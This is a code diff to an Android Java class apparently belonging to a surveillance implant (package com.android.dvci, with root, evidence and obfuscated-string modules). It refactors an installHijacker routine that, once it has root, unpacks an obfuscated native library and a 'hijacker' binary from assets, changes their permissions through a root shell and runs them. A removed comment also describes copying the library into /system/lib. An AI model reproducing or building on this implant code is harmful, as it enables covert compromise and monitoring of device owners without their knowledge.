@@ -14,11 +14,9 @@ import com.android.dvci.Beep;
 import com.android.dvci.Root;
 import com.android.dvci.Status;
 import com.android.dvci.auto.Cfg;
-import com.android.dvci.capabilities.PackageInfo;
 import com.android.dvci.conf.Configuration;
 import com.android.dvci.evidence.EvidenceBuilder;
 import com.android.dvci.file.AutoFile;
-import com.android.dvci.file.Directory;
 
 import com.android.mm.M;
 
@@ -58,9 +56,6 @@ public class Instrument {
 	}
 
 	private boolean installHijacker() {
-		InputStream stream = Utils.getAssetStream(M.e("ib.data")); // libt.so
-		if (Cfg.DEBUG) { Check.asserts(stream!=null, " (installHijacker) Assert failed"); }
-
 		try {
 			if (!Status.haveRoot()) {
 				if (Cfg.DEBUG) {
@@ -70,24 +65,13 @@ public class Instrument {
 				return false;
 			}
 
+			Utils.dumpAsset(M.e("ib.data"), lib);
+			Utils.dumpAsset(M.e("mb.data"), hijacker);
+
 			// Install library
-			Root.fileWrite(lib, stream, Cfg.RNDDB);
 			Execute.execute(Configuration.shellFile + " " + M.e("pzm 666 ") + path + "/" + lib);
-
-			// copy_remount libt.so to /system/lib/
-			// Execute.execute(Configuration.shellFile + " " + "fhs" + " " +
-			// "/system" + " " + path + "/" + lib + " " + "/system/lib/" + lib);
-
-			stream.close();
-
-			// Unpack the Hijacker
-			stream = Utils.getAssetStream(M.e("mb.data")); // Hijacker
-
-			Root.fileWrite(hijacker, stream, Cfg.RNDDB);
-
 			Runtime.getRuntime().exec(Configuration.shellFile + " " + M.e("pzm 750 ") + path + "/" + hijacker);
 
-			stream.close();
 		} catch (Exception e) {
 			if (Cfg.EXCEPTION) {
 				Check.log(e);
